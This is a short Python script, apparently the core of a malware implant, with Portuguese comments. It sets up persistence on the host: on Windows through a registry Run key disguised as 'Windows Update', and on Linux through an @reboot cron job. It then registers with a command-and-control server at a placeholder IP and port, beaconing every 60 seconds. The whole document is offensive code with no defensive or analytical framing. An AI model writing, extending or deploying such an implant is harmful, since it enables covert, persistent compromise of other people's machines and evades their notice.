import requests
import os
import time
import platform

def connect_to_server(server_url, identifier):
    try:
        data = {'identifier': identifier}
        response = requests.post(f"{server_url}/register", data=data)
        print(response.text)
    except Exception as e:
        print(f"Connection failed: {e}")

def add_persistence():
    if platform.system() == "Windows":
        # Adiciona persistência no Windows
        script_path = os.path.abspath(__file__)
        name = "Windows Update"
        cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{name}" /t REG_SZ /d "{script_path}" /f'
        os.system(cmd)
    elif platform.system() == "Linux":
        # Adiciona persistência no Linux
        script_path = os.path.abspath(__file__)
        cron_job = f"@reboot python3 {script_path}"
        with open("mycron", "w") as cron_file:
            cron_file.write(cron_job + "\n")
        os.system("crontab mycron")
        os.remove("mycron")

if __name__ == "__main__":
    server_url = "(IP):5043"  # URL do servidor
    identifier = "Machine"  # Identificador único
    add_persistence()
    while True:
        connect_to_server(server_url, identifier)
        time.sleep(60)  # Conecta ao servidor a cada 60 segundos
